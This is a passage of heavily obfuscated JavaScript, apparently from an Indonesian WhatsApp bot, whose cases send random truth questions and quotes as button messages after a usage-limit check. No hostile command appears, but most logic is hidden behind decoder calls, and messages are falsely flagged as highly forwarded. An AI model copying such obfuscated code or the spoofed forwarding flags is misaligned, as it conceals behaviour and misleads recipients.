(0xbf2,0xa5b,0xdb3,0x10d8)+'tangan?\x20ka'+'lo\x20pernah\x20'+_0x134458(0xb33,0xe96,0xc22,0xd8c)+'?\x20rasanya\x20'+'gimana\x20bro'+'u?','pernah\x20jad'+'i\x20selingku'+_0x134458(0x770,0x46c,0x36c,0xbb1),'hal\x20yang\x20p'+'aling\x20dita'+_0x15af3d(0x32c,0x573,0x71a,0x38a),_0x134458(0x3b2,0x4a,0x12,0x556)+'g\x20yang\x20pal'+'ing\x20berpen'+'garuh\x20kepa'+'da\x20kehidup'+'anmu',_0x134458(0x28f,0x14d,-0x28,-0x248)+_0x134458(0x608,0x594,0x86c,0x392)+'\x20yang\x20kamu'+_0x134458(0x83f,0x6b3,0x4a7,0xb8b)+_0x134458(0x25e,0x307,-0x156,0x493)+'ni',_0x134458(0x3b2,0x7f2,0x5e1,0x4f9)+_0x15af3d(0x5b6,0x491,0x6cd,0x739)+_0x134458(0x4c2,0x1fe,0x456,0x93f)+_0x15af3d(0xb16,0x85e,0x96c,0x705),_0x134458(0x3b2,0x6c7,0x5df,0x408)+_0x15af3d(0x985,0xbfa,0x55c,0xc87)+_0x134458(0x676,0x440,0x2a4,0x182)+_0x134458(0x61c,0x199,0x1a3,0x907),'(bgi\x20yg\x20mu'+_0x15af3d(0x326,0x575,0x2d,0x787)+_0x134458(0x258,0x343,0x664,-0xdc)+'t\x20seharian'+'?',_0x15af3d(0x5fc,0xa9f,0x73e,0x75b)+_0x15af3d(0x6a8,0x754,0x804,0x87f)+'ndekati\x20ti'+'pe\x20pasanga'+_0x15af3d(0x948,0x6e2,0xabd,0x95c)+_0x134458(0x824,0x423,0x42c,0x3ee),_0x134458(0x686,0x20f,0x86a,0x289)+_0x134458(0x2ae,0x21d,0x21f,0x6f)+_0x134458(0x4f1,0x1cf,0x4dd,0x5b8)+_0x15af3d(0x898,0x925,0x8ae,0x5c2),'pernah\x20nol'+'ak\x20orang?\x20'+'alasannya\x20'+_0x15af3d(0x8f9,0x4cd,0x7f8,0x486),_0x15af3d(0x953,0x625,0xc8d,0x548)+'ejadian\x20ya'+'ng\x20bikin\x20k'+_0x134458(0x17f,-0x1a4,0x54d,-0x2d4)+_0x15af3d(0x888,0xd2e,0x5f6,0x603)+_0x15af3d(0x876,0xb4a,0xa3a,0x688)+_0x15af3d(0x7d4,0x5fc,0xaab,0x50a),_0x134458(0x7ba,0xb9d,0x73b,0x747)+_0x134458(0x485,0x8,0x4b,0x691)+_0x15af3d(0x8e0,0xa1b,0xa6b,0xb4f)+_0x15af3d(0x301,0x5d,0x13d,0x49a)+_0x134458(0x92a,0xe04,0x4ad,0xad7),_0x134458(0x6c5,0x9b2,0x316,0x3f3)+_0x134458(0x5f7,0x26b,0x60c,0x977)+_0x15af3d(0x8d8,0x764,0xa43,0xda1)+_0x15af3d(0x618,0xa6d,0x126,0x3ef)+'?'],ttrth=trut[Math[_0x15af3d(0xadc,0x841,0xf61,0xd4d)](Math[_0x15af3d(0x696,0x5ca,0x3d0,0x760)]()*trut[_0x134458(0x76b,0x419,0x9ab,0x4eb)])],_0x153779={};_0x153779[_0x15af3d(0x6ec,0x642,0xba4,0x3f3)+'t']='☠️\x20Owner\x20';const _0x27f54e={};_0x27f54e[_0x15af3d(0xc33,0x94b,0x765,0xba9)]=_0x134458(0x2c0,-0x155,0x4ed,0x4f6),_0x27f54e[_0x134458(0x454,0x5cf,0x70,0x29e)]=_0x153779,_0x27f54e['type']=0x1;const _0x171709={};_0x171709[_0x15af3d(0x6ec,0x21d,0x4c5,0x9fe)+'t']=_0x15af3d(0x9b0,0xa7e,0x533,0xc45);const _0x44b79a={};_0x44b79a['buttonId']=''+command,_0x44b79a[_0x15af3d(0x5a7,0x8b7,0x277,0x23a)]=_0x171709,_0x44b79a[_0x15af3d(0xa52,0x863,0xc7f,0xa7c)]=0x1;var buttonns=[_0x27f54e,_0x44b79a];buttonMessage={'contentText':ttrth,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x15af3d(0x2f6,0x4fc,0x227,0x5c0)+_0x134458(0x269,-0x63,0x13a,-0x276))+enter+_0x15af3d(0x919,0x7d3,0x5ff,0x79e)+sender[_0x15af3d(0x53f,0x83c,0x5ed,0x9ed)]('@')[0x12e8+-0x1723*0x1+0x43b*0x1],'buttons':buttonns,'headerType':0x1};const _0x29136c={};_0x29136c[_0x15af3d(0xb6e,0xd8e,0x826,0xbfc)]='hi',_0x29136c[_0x134458(0x79e,0xb6c,0x4b2,0x6a6)+'Score']=0x3b9aca00,_0x29136c[_0x15af3d(0x588,0x270,0x227,0x52a)+'d']=!![],_0x29136c[_0x134458(0x4d7,0x144,0x806,0x176)+_0x15af3d(0x5ca,0x9f3,0x9cd,0x545)]=!![],_0x29136c[_0x134458(0x403,0x381,0x618,0x632)+'id']=[sender];const _0x3ccdf1={};_0x3ccdf1[_0x15af3d(0x540,0xeb,0x1fb,0x18e)]='Botwea\x20©2k'+'21',_0x3ccdf1['contextInf'+'o']=_0x29136c,_0x3ccdf1['quoted']=ftoko,_0x3ccdf1[_0x15af3d(0x62a,0x61b,0xa25,0x44a)+_0x134458(0x477,-0x23,0x164,0x944)]=!![],alpha[_0x15af3d(0xad5,0xa34,0xc93,0x9f7)+'e'](from,buttonMessage,MessageType[_0x15af3d(0x2a4,0x12a,-0xad,0x724)+_0x15af3d(0xaf6,0xdab,0xb25,0xc98)],_0x3ccdf1),await limitAdd(sender,limit);break;case _0x134458(0x2a9,-0x1e8,0x32c,0x312):const _0x50ffe={};_0x50ffe[_0x15af3d(0x6ec,0xa5f,0x282,0x62e)+'t']=_0x134458(0x806,0xbbd,0x981,0xc13)+'t';const _0x571e17={};_0x571e17[_0x15af3d(0xc33,0xef0,0x99b,0x1055)]='limit',_0x571e17[_0x134458(0x454,0x748,0x5d4,0x507)]=_0x50ffe,_0x571e17[_0x134458(0x8ff,0x783,0x5de,0x45d)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x8fd,0x8a8,0xaeb)](prefix),'©\x20'+ownername,[_0x571e17]);const cc=[_0x134458(0x7d7,0x908,0x5ed,0xccc)+'u\x20hanya\x20un'+_0x134458(0x249,0x573,0x4b1,0x559)+_0x15af3d(0x77d,0x879,0x74f,0x4ab)+_0x15af3d(0x7ca,0xc8b,0x2f6,0xc4b)+'caya\x20diri.'+'\x20Dan\x20sekar'+_0x15af3d(0x4df,0x235,0x166,0x244)+_0x134458(0x25f,0x3c7,0x60b,0x346)+_0x134458(0xb17,0xc7e,0xff2,0x9db)+_0x15af3d(0xa8e,0xee0,0x935,0xd97),_0x134458(0x41b,0x93,0x513,0x4ec)+_0x134458(0x195,0x12a,0x621,0x11d)+_0x15af3d(0x448,0x2a2,0x11e,0x19d)+'n,\x20kalau\x20k'+'amu\x20ningga'+_0x134458(0x8a3,0x759,0x3cc,0xac3)+_0x15af3d(0x3c1,-0x10b,0x528,0x7ba)+_0x134458(0x360,0x17a,0x243,0x3f7)+_0x15af3d(0xb65,0xf08,0xa11,0xdb8)+_0x15af3d(0x82d,0x8da,0x7cf,0x669)+_0x15af3d(0xc0a,0x10fa,0xa10,0x8ce),_0x15af3d(0x730,0xad3,0xb3f,0xa5f)+_0x15af3d(0x5d5,0x6f9,0x55b,0x33e)+_0x134458(0x624,0x6f2,0xa46,0x7af)+_0x134458(0x31e,0x3e2,0x669,-0x4e)+_0x134458(0x5a5,0x494,0x9c9,0x622)+_0x15af3d(0x8ba,0xa51,0x764,0x63b),'Meskipun,\x20'+'perasaan\x20c'+_0x134458(0x457,0x669,0x45b,0x8ab)+_0x15af3d(0x98d,0xc5d,0x581,0xa2e)+_0x15af3d(0x47b,0x8eb,0x4a5,0x54b)+_0x134458(0x1ba,-0x23e,0x153,0x678)+_0x134458(0x6fe,0x6bb,0x5cb,0x59c)+_0x134458(0x9eb,0x68d,0xa38,0xb3a)+'erjebak\x20ol'+_0x134458(0x605,0x4fb,0x4fb,0x99a)+_0x134458(0x697,0xb0d,0x69a,0x48a)+_0x134458(0x955,0x7ce,0x81d,0x89d)+'\x20merasa\x20ce'+_0x15af3d(0x6c6,0x997,0x545,0x891),'Tak\x20semua\x20'+'yang\x20kita\x20'+_0x134458(0xa6d,0xd7d,0xe59,0xc18)+_0x134458(0x75e,0x3f4,0x7cc,0xa1f)+_0x15af3d(0xbb4,0xff7,0x90a,0x935)+_0x134458(0x182,0x51e,0x5d2,0x484)+'ya.\x20Andai\x20'+_0x15af3d(0x7a8,0xabf,0xb66,0x7a2)+_0x134458(0x2d6,0x15a,-0x34,0xe6)+_0x134458(0x944,0x9f6,0xab2,0xb5a)+'ndai.',_0x134458(0x66b,0x227,0x2e1,0x802)+_0x134458(0xa9b,0x908,0x8c1,0x715)+_0x15af3d(0x7cb,0x8cb,0x4d4,0xc82)+_0x15af3d(0x933,0x752,0x7d2,0x60f)+_0x15af3d(0x399,0x81c,0xf0,0x216)+_0x134458(0xa80,0x735,0x5f9,0x598),_0x134458(0x8a6,0xcd3,0xd18,0x4b2)+_0x134458(0xa1e,0xaa5,0xb95,0xdd3)+_0x15af3d(0xb4f,0x91c,0xbee,0x99f)+_0x15af3d(0x8ce,0xb46,0x4ee,0xc6e)+_0x15af3d(0x6aa,0x684,0xa73,0x70a)+_0x15af3d(0xbb7,0xedc,0x938,0xd34)+_0x15af3d(0xbed,0xad5,0xce1,0xa5d),'Jika\x20hujan'+_0x15af3d(0x4c4,0x54a,0x802,0x961)+_0x134458(0xa22,0xa5e,0xa56,0xc84)+'rimu\x20jaket'+_0x15af3d(0x313,0x65,0x10,0x40c)+_0x15af3d(0x53d,0x788,0x454,0x8e)+_0x15af3d(0xb4d,0xb65,0xa52,0xe17)+_0x15af3d(0x553,0x502,0x63a,0x7d2)+_0x134458(0x7d9,0x830,0x370,0x9e0)+_0x134458(0x512,0x2fd,0x9e4,0x2e1),_0x134458(0x649,0xad4,0x2ad,0x3ac)+'intaimu\x20ad'+_0x134458(0xaa0,0xe49,0xf00,0xa78)+_0x15af3d(0x6de,0xb33,0x232,0x9fe)+_0x15af3d(0x34d,0x743,0x271,-0xa8)+'\x20Aku\x20salah'+_0x15af3d(0x5d1,0x87a,0x55f,0x50a)+'a.','PR-ku\x20adal'+_0x15af3d(0x9a4,0x9fb,0xde6,0x8f0)+_0x134458(0x417,0x6d0,0x59e,0x541)+'ih\x20kuat\x20da'+'ri\x20Matemat'+_0x15af3d(0xba3,0xdfb,0xeb6,0x8b9)+'\x20luas\x20dari'+_0x15af3d(0x2d0,0x9b,0x77d,0x227)+_0x134458(0x5d6,0xaa5,0x385,0x553)+'a\x20dari\x20Bio'+'logi.','Kalau\x20kamu'+_0x15af3d(0xb39,0x690,0x8a3,0xdbb)+_0x15af3d(0x4dc,0x36c,0x73e,0x22)+'hak\x20kamu,\x20'+_0x134458(0x838,0x9c7,0x8d5,0xca0)+_0x15af3d(0x3ed,0x51f,0x574,0x716)+'\x20ninggalin'+_0x15af3d(0xa26,0x59e,0x995,0xba5)+'\x20takut\x20kam'+'u\x20kecewa.',_0x134458(0x41b,0x5ec,0x91,0x49c)+_0x15af3d(0x2e8,-0x14c,0x731,0x6c0)+'ru.\x20Malaha'+_0x134458(0xa81,0xa93,0x942,0xb15)+_0x15af3d(0x695,0x6a3,0x1ac,0x66d)+_0x134458(0x8a3,0x86a,0x7fa,0xbee)+_0x15af3d(0x3c1,0x100,0x5da,0x845)+_0x15af3d(0x4b3,0x47a,0x2cd,-0x3e)+_0x15af3d(0xb65,0xcbd,0xc6b,0xf65)+_0x15af3d(0x82d,0x9b5,0x423,0xc3f)+_0x134458(0x414,0xb5,0x497,0x5b0),_0x134458(0x29b,0x25a,0x1f7,0x6dd)+_0x15af3d(0xaa9,0xd1d,0x5e0,0x6cd)+'h-jauh\x20kan'+'\x20ada\x20darah'+'ku\x20di\x20tubu'+_0x134458(0x9dd,0xaa7,0x57a,0xb55),_0x134458(0x6c0,0x855,0x4e2,0x5ba)+_0x134458(0x660,0x9b9,0x84e,0x7da)+'\x20bukan\x20aku'+_0x134458(0x91e,0xdd3,0x7da,0x684)+_0x15af3d(0x377,0x3de,0x322,0x101)+'mbawa\x20aku\x20'+'pergi,\x20tet'+_0x15af3d(0x889,0x9f2,0x842,0x93b)+_0x15af3d(0xc7e,0x1152,0xe32,0xbd4)+'ama,\x20bersi'+'fat\x20menjal'+_0x134458(0x465,0x161,0x202,0x1a5)+_0x134458(0x305,0x7fa,0x733,0x26c),_0x134458(0xa62,0xd7b,0x765,0x835)+_0x134458(0x31f,0x4ac,-0xa1,0x1cb)+_0x134458(0x95f,0x8d4,0x4e4,0xb02)+_0x134458(0x879,0x93b,0xb75,0x9c1)+_0x134458(0x2fe,0x1cd,-0x13c,0x58)+_0x15af3d(0x3b0,0x67f,0x524,0x221)+'aja\x20membia'+_0x15af3d(0x89e,0xb5b,0xd0c,0xa5d)+'akukan\x20apa'+'\x20yang\x20kamu'+_0x15af3d(0x59a,0x79b,0xa2d,0x545)+_0x134458(0xa0c,0x6fb,0x627,0xc22)+_0x15af3d(0xbeb,0x83c,0x949,0x867)+'hal\x20yang\x20a'+'kan\x20beraki'+'bat\x20buruk\x20'+_0x134458(0x5f3,0x1e5,0x3c3,0x6ba)],si=cc[Math[_0x15af3d(0xadc,0xa89,0xd0e,0xa50)](Math[_0x15af3d(0x696,0x389,0x7e5,0xa56)]()*cc[_0x15af3d(0x8be,0xd60,0xc02,0x5d9)])],_0x5e40b7={};_0x5e40b7[_0x134458(0x599,0x187,0x252,0x425)+'t']='☠️\x20Owner\x20';const _0x21935b={};_0x21935b[_0x15af3d(0xc33,0xfde,0xf88,0xdc8)]=_0x15af3d(0x413,0x229,0x3f4,0x10d),_0x21935b[_0x134458(0x454,0x6a1,0x258,0x2b3)]=_0x5e40b7,_0x21935b[_0x15af3d(0xa52,0x713,0x629,0xf13)]=0x1;const _0x10931c={};_0x10931c[_0x134458(0x599,0x920,0x799,0x411)+'t']=_0x15af3d(0x9b0,0xcb8,0xc96,0xdcd);const _0x2bc642={};_0x2bc642[_0x134458(0xae0,0x91b,0xd59,0xa1b)]=''+command,_0x2bc642[_0x15af3d(0x5a7,0x4ea,0x3fe,0x19c)]=_0x10931c,_0x2bc642['type']=0x1;var buttonns=[_0x21935b,_0x2bc642];buttonMessage={'contentText':si,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+'more\x20quote'+'s\x20💞')+enter+'~\x20@'+sender[_0x15af3d(0x53f,0x262,0x34a,0x2ed)]('@')[-0xa2a+-0x1ba9*-0x1+-0x117f],'buttons':buttonns,'headerType':0x1};const _0x59a3a3={};_0x59a3a3[_0x134458(0xa1b,0xa68,0x8d6,0x70d)]='hi',_0x59a3a3[_0x15af3d(0x8f1,0xb30,0x451,0xcbe)+'Score']=0x3b9aca00,_0x59a3a3[_0x15af3d(0x588,0x9fc,0x7ad,0x253)+'d']=!![],_0x59a3a3[_0x134458(0x4d7,0x84d,0xd8,0x32a)+_0x15af3d(0x5ca,0x7bd,0x6e5,0x19c)]=!![],_0x59a3a3[_0x134458(0x403,0x3d7,0x7b6,0x345)+'id']=[sender];const _0x1555b4={};_0x1555b4[_0x15af3d(0x540,0x235,0x60f,0xea)]=_0x15af3d(0x63d,0x19f,0x3f9,0x8d7)+'21',_0x1555b4[_0x134458(0x968,0xae7,0xbfb,0x618)+'o']=_0x59a3a3,_0x1555b4[_0x15af3d(0xc2e,0xf86,0xdde,0xe8e)]=ftoko,_0x1555b4[_0x134458(0x4d7,0x880,0x24f,0x85d)+_0x15af3d(0x5ca,0x4e9,0x24d,0x928)]=!![],alpha[_0x15af3d(0xad5,0xc8a,0x679,0xd23)+'e'](from,buttonMessage,MessageType[_0x134458(0x151,0x27a,-0x203,0x23a)+'sage'],_0x1555b4),await limitAdd(sender,limit);break;case _0x15af3d(0x5bf,0x634,0x3d8,0x489)+_0x15af3d(0x956,0x8fc,0xc47,0x727):const _0x1a542c={};_0x1a542c['displayTex'+'t']='Check\x20Limi'+'t';const _0x544746={};_0x544746[_0x15af3d(0xc33,0x97a,0x9f4,0x1027)]=_0x134458(0x7fd,0x64f,0xc72,0x38e),_0x544746['buttonText']=_0x1a542c,_0x544746[_0x134458(0x8ff,0xafa,0xb89,0x96c)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x96d,0x6e9,0xb18)](prefix),'©\x20'+ownername,[_0x544746]);const kata_lucu=[_0x134458(0xa2e,0xa42,0xb51,0x86c)+_0x134458(0x8aa,0x798,0x9a8,0x5ac)+_0x134458(0x5db,0x673,0x8fa,0x40d)+_0x15af3d(0x5f7,0x9b6,0xad1,0x9b2)+_0x134458(0x2ba,0x2a6,0x212,-0x87)+'reka\x20menja'+'di\x20bijak\x20s'+_0x15af3d(0xb56,0xc94,0xd47,0xe49)+_0x15af3d(0x692,0x754,0x399,0x1c1),_0x15af3d(0x2fc,0x2a4,0x5b8,0x4ed)+_0x134458(0x7d4,0xc0d,0x9da,0x740)+'suksesan\x20y'+'ang\x20tertun'+_0x15af3d(0x331,0x705,0xe8,0x179)+'gan\x20adalah'+_0x15af3d(0xbb8,0x1054,0xfca,0xb48)+_0x15af3d(0xc23,0xd23,0xa50,0x9ea)+_0x15af3d(0x943,0x54f,0xafc,0xcc3),_0x15af3d(0x7ff,0x5c8,0xa74,0x547)+_0x15af3d(0xa6a,0xe41,0x601,0xf36)+_0x134458(0xa66,0xae0,0xa86,0x7c7)+_0x134458(0x363,0x2db,0x64,0x3c3)+'ya\x20milik\x20t'+_0x15af3d(0xc12,0xa83,0xf3b,0xccb),_0x134458(0x757,0x8ab,0x6e2,0xb06)+_0x15af3d(0x8ef,0xa0a,0x952,0xcdf)+_0x15af3d(0xa3d,0x7c9,0x95d,0x784)+_0x15af3d(0x425,0x1e7,0x51d,0x51d)+_0x15af3d(0x6be,0x6fd,0x4ae,0x8f9)+_0x134458(0xa45,0x73d,0xa93,0xda6)+_0x15af3d(0x491,0x665,0x7e0,0x694)+_0x134458(0x79d,0x7ad,0x4bc,0x34d)+_0x134458(0x3e9,0x217,0x398,0x15)+_0x15af3d(0x874,0x733,0x8a3,0x688)+'k\x20dikerjak'+_0x134458(0x712,0x36d,0x913,0x656),'“Sayang…\x20t'+'adi\x20pagi\x20a'+'ku\x20tidak\x20b'+_0x15af3d(0x897,0x871,0x5a5,0xd07)+_0x134458(0x1c3,0x35c,0x134,-0x1c2)+_0x134458(0x633,0x7bc,0x60c,0xaa6)+'mu,\x20siangn'+'ya\x20juga\x20ti'+'dak\x20makan\x20'+'karena\x20mem'+_0x15af3d(0x4b7,0x76f,0x503,0x648)+_0x15af3d(0x727,0x949,0x7e8,0x64d)+_0x134458(0xacf,0xf22,0xbf9,0xe1d)+_0x15af3d(0x7fd,0x934,0x3cf,0x8f4)+_0x15af3d(0xa8a,0x96a,0x819,0xb7f)+_0x15af3d(0x744,0x365,0xbb1,0x6ea)+_0x15af3d(0x81a,0xcdc,0xa62,0x357),_0x134458(0xab3,0x7e5,0x771,0xb93)+_0x134458(0x811,0x40f,0x6b5,0x987)+_0x134458(0x425,0x3bc,0x73c,0x31c)+_0x134458(0x171,-0x14c,-0x28b,0x5f6)+_0x15af3d(0x847,0x58c,0x74c,0x37f)+_0x134458(0x903,0x992,0x4ff,0xdef)+_0x134458(0x9f3,0xd4e,0x5f7,0x698)+_0x15af3d(0x4bd,0x4d7,0x74a,0x166)+_0x15af3d(0x66b,0x7ac,0x40d,0x6da)+'gkin\x20jodoh'+'mu\x20telah\x20m'+_0x15af3d(0x96f,0x64b,0x9aa,0x7b9)+_0x15af3d(0x9a1,0x998,0x781,0x9d6)+'bayi.”',_0x15af3d(0xa4d,0x66c,0xcaa,0x6cc)+_0x15af3d(0x88e,0x92f,0x405,0xa6d)+_0x134458(0x82c,0x75b,0x8da,0x74d)+'ebuah\x20impi'+_0x15af3d(0x386,0x3e3,-0x12,0x675)+_0x15af3d(0x736,0x64b,0x6c7,0x5fe)+_0x15af3d(0x642,0x6f6,0x43b,0x68a)+'ta\x20tidur.\x20'+_0x15af3d(0x90b,0x567,0xd18,0x864)+_0x15af3d(0x3d6,0x54b,-0x51,0x80a)+_0x134458(0x775,0x6a9,0x2e3,0x696)+_0x134458(0x1fe,0x59d,0x155,-0x2f1)+_0x134458(0x925,0x782,0x7a1,0x757)+_0x134458(0x913,0x58d,0x59f,0xada)+_0x15af3d(0x4cf,0x8b1,0x8bd,0x4e4)+_0x15af3d(0x2c9,0xf2,0x34c,-0x1ff),_0x15af3d(0xbce,0x7c3,0xd03,0xff2)+_0x134458(0xa93,0xd42,0xb78,0xcea)+_0x134458(0x6d4,0x4d9,0x9a3,0x29e)+_0x15af3d(0x455,0x703,0x12e,0x25)+_0x134458(0x5e6,0x1c2,0xad7,0x863)+_0x134458(0x1bf,0x3e9,0x43,-0x138)+_0x134458(0x8c9,0xc1d,0xb62,0x99f)+'menyenangk'+_0x15af3d(0x8e7,0xb0c,0x415,0x8de)+'apalagi\x20wa'+_0x134458(0x984,0xbe1,0x8f0,0xdf4)+'jelek.”','“Dalam\x20pan'+_0x15af3d(0x535,0x736,0x227,0x85c)+_0x134458(0x1d6,0x17a,0x618,0xf2)+_0x134458(0x53b,0x2d7,0x79c,0x79d)+'t\x20yang\x20kua'+_0x15af3d(0x9b3,0x78b,0x945,0x6b0),_0x134458(0x5a6,0x3c2,0x48c,0x504)+_0x15af3d(0xaf2,0xdc4,0xfc2,0xfad)+_0x15af3d(0x496,0x4d1,0x7f4,0x54c)+_0x134458(0xaed,0xe54,0xfab,0x7d3)+'i\x20tertangk'+_0x15af3d(0x405,0x54,0x836,0x534),'“Uang\x20buka'+'n\x20segalany'+_0x15af3d(0x37a,0x745,0x33d,0x41b)+_0x15af3d(0x545,0x92e,0x68,0xa2b)+_0x15af3d(0x3a6,0x327,0x639,0x1dd)+_0x15af3d(0xa67,0xc88,0xae9,0xc82),_0x15af3d(0x2f8,0x221,-0x187,0x562)+_0x134458(0x9fb,0x55d,0xe9d,0x76b)+_0x15af3d(0x378,0xc6,0x38c,0x817)+'\x20impianmu\x20'+_0x134458(0x68b,0xb62,0x2cc,0x799)+_0x134458(0x36b,0x45b,-0x12e,0x53a)+_0x134458(0x9a7,0xba5,0xbdc,0xde4)+_0x134458(0x75f,0xa0e,0x599,0x809),_0x134458(0x4d5,0x412,0x5bf,0x98b)+'emas,\x20emas'+_0x134458(0x218,0x19d,0x1b4,0x30f)+_0x15af3d(0xa3c,0x9aa,0xcbf,0x5f4)+'itu\x20tai,\x20j'+_0x134458(0x8a4,0xa2a,0xace,0xbe0)+_0x134458(0x786,0x85b,0xad6,0x4d2)+'t.”','“Saat\x20kamu'+_0x15af3d(0x9cf,0xbdd,0x611,0x52e)+_0x134458(0x51e,0x8c8,0x824,0xa01)+',\x20maka\x20tem'+_0x134458(0x29f,0x608,-0x111,0x4)+_0x15af3d(0xb6c,0xe24,0xa79,0xa0e)+_0x15af3d(0x528,0x749,0x482,0xa4)+_0x134458(0x2d9,-0x155,0x2d6,0x44f)+'amu.\x20Tapi,'+_0x15af3d(0xadd,0x618,0xbb6,0xa52)+_0x15af3d(0x585,0x96b,0x476,0x182)+_0x15af3d(0x5ff,0x708,0x749,0x302)+_0x134458(0x918,0x655,0x7f9,0xcb9)+_0x15af3d(0x3ce,-0x64,0x134,0x2d5)+_0x134458(0xb27,0xc0d,0x7d4,0x78e)+_0x134458(0x34e,0x6b0,0x48e,0x83)+_0x15af3d(0x624,0x53b,0x74f,0x728),'“Setiap\x20ma'+_0x134458(0x8b8,0xa7f,0x812,0xad1)+_0x15af3d(0xb0f,0xf00,0xa43,0xed3)+_0x134458(0x1ea,0x291,0x68f,0x5f9)+_0x15af3d(0x60e,0x906,0xace,0x539)+_0x15af3d(0xb13,0xe79,0xf0f,0xd4e)+_0x134458(0x2a6,0x1b3,0x3c9,-0xb0)+_0x15af3d(0x2cd,0x4b6,0x75,0x5af)+_0x134458(0x72c,0x636,0x3ae,0x415)+_0x15af3d(0xa10,0x590,0x99f,0x7f3)+_0x15af3d(0x566,0x3cd,0x854,0x3fb)+_0x134458(0x3e6,0x718,0x269,0x43e)+_0x15af3d(0x8b0,0x9ec,0xa53,0xd72),_0x15af3d(0xa20,0xd45,0xe4c,0x805)+'ntaranmu\x20t'+_0x134458(0x2bb,-0x235,0x716,0x173)+'up\x20untuk\x20m'+'eyakinkan\x20'+'dan\x20memuka'+'u\x20seseoran'+_0x134458(0x861,0x984,0x37d,0x4b5)+'ngungkanla'+'h\x20dia\x20deng'+_0x15af3d(0xb1b,0x84e,0x962,0xc2a)+'anmu.”',_0x134458(0x7bc,0xca1,0x8fd,0x2d9)+_0x15af3d(0x951,0x6ca,0x678,0xad4)+_0x134458(0x764,0xb7f,0x870,0x991)+_0x15af3d(0xc51,0xb6c,0x10db,0x1054)+_0x15af3d(0x441,0x34e,0x33f,0x1ec)+_0x134458(0x35d,-0x12a,0x4a9,0x3e7)+_0x15af3d(0x42d,0x156,0x1f7,0x39e)+_0x134458(0x2e8,0x3fb,0x21b,0x5ee)+_0x15af3d(0xc60,0xe4c,0x10aa,0xfec)+_0x15af3d(0x564,0x5eb,0x78c,0x243)+'ang\x20yang\x20b'+'isa\x20mencon'+'tek\x20yang\x20p'+_0x134458(0x6e3,0x554,0x54e,0x63c),'“Kegagalan'+_0x134458(0x7d4,0x776,0x977,0x419)+_0x15af3d(0x4d8,0x500,0x840,0x334)+_0x134458(0xad0,0xfa7,0x889,0xa43)+_0x15af3d(0x6db,0x3f0,0x83a,0xb31)+_0x134458(0x825,0x832,0xb09,0x8a1)+'\x20adalah\x20ke'+_0x15af3d(0x892,0xc44,0x502,0x5cd)+_0x134458(0x789,0x34f,0xb4b,0x412)+'a.”',_0x134458(0x5b3,0x4f4,0x50f,0x5ad)+_0x134458(0x9e3,0xb5e,0xdc1,0x5a2)+_0x15af3d(0x8de,0xd47,0xa4d,0x606)+'sehat.\x20Gel'+_0x15af3d(0xbbe,0x6cb,0x1013,0x8dc)+_0x15af3d(0x922,0xb1c,0xb38,0x5d1)+_0x134458(0x847,0x7e7,0x3bc,0x5f4)+_0x15af3d(0xbaa,0x959,0xa05,0x1079)+'i\x20celana\x20A'+_0x134458(0x71c,0x512,0x77b,0x26b)+_0x15af3d(0x896,0xd0d,0x82b,0xba9),'“Saya\x20tida'+_0x134458(0x421,0x3f0,0x65b,0x516)+_0x15af3d(0xacc,0xd9b,0x8fe,0xbd3)+_0x15af3d(0x4d9,0x6f5,0x485,0x851)+'ta…tapi\x20sa'+_0x134458(0x9f6,0x872,0x9e5,0xe22)+_0x134458(0x9e7,0xed0,0xc96,0xb98)+_0x15af3d(0x4f6,0x65,0x8d,0x7f),_0x15af3d(0x45d,0x94b,0x44a,0x3b0)+_0x15af3d(0xbe1,0xaab,0xd0b,0x7eb)+'pagar\x20peli'+_0x134458(0x315,0x2ef,0x38d,0x62d)+'ar\x20seharus'+_0x15af3d(0x364,0x9,0x13f,0x5bb)+_0x15af3d(0x2cf,0x4b,0x5b2,0x73c)+_0x15af3d(0x69c,0x236,0x30d,0x8f5)+_0x15af3d(0x46d,0x8b0,0x4f3,0x2c7)+_0x15af3d(0x391,0x78a,0x96,0x9)+_0x15af3d(0x70e,0x3e1,0x52d,0x82b),_0x134458(0x558,0x2ed,0x77e,0x9e0)+_0x134458(0x5a8,0x3d5,0x3fd,0x43e)+_0x134458(0x689,0x5bc,0x9d0,0x9c2)+_0x15af3d(0x510,0x27b,0x589,0x6e8)+'\x20tepian…be'+_0x15af3d(0xb9d,0x1015,0x1069,0x8ea)+'it\x20dahulu,'+_0x134458(0x373,0x36e,0x52a,-0x108)+_0x134458(0x420,0x2c9,0x651,0x28d)+_0x15af3d(0x48a,0x6c1,0x5d,0x91),_0x15af3d(0x65a,0x5b1,0x7b1,0xac3)+_0x15af3d(0x2a7,-0x59,0x136,0x76e)+_0x15af3d(0xaaa,0x971,0xe3b,0x880)+'a\x20sekampun'+_0x134458(0x4a7,0x247,0x884,0x59b)+'satu\x20saja\x20'+'sudah\x20repo'+_0x15af3d(0x7d1,0x39d,0x689,0xb8e)+_0x134458(0x18f,-0x296,0x14d,0x389)+_0x15af3d(0x595,0x95d,0x849,0x5bc)+_0x134458(0xa34,0xda3,0xec9,0x8d9),_0x15af3d(0x967,0x883,0x4d0,0xb2a)+_0x15af3d(0x3bf,0x556,0x7a6,0x8c)+'ta\x20menjadi'+'\x20sempurna,'+_0x134458(0x19c,0x2c0,-0x345,-0x193)+'k\x20ada\x20manu'+_0x134458(0x2f7,-0x1e8,0x4bc,0x31c)+'empurna,\x20j'+_0x134458(0x90a,0xab9,0xd50,0xab6)+'pa\x20kita\x20su'+_0x134458(0xa77,0x88b,0x8ce,0x903)+_0x134458(0x96d,0xc0e,0xaa3,0x81b),_0x15af3d(0x4aa,0x909,0x14a,0x590)+_0x134458(0x932,0x95a,0xd95,0x9f6)+_0x134458(0x60c,0x57f,0x961,0x6f1)+_0x15af3d(0xc0d,0x994,0xfe9,0xb51)+_0x134458(0x70c,0x280,0xa25,0xb28)+_0x15af3d(0x32f,0x484,0x4a3,-0xde)+_0x15af3d(0x484,0x42d,0x894,-0xe)+_0x134458(0x802,0xc0b,0x3cc,0xb61)+_0x134458(0x2cd,0x5f5,-0x7a,0x2c9)+_0x15af3d(0xc7f,0x92d,0x10da,0xea5),_0x15af3d(0x3cd,0x104,-0x33,0x473)+_0x134458(0x9b7,0xbd3,0xe07,0xc2d)+_0x15af3d(0x5f0,0x7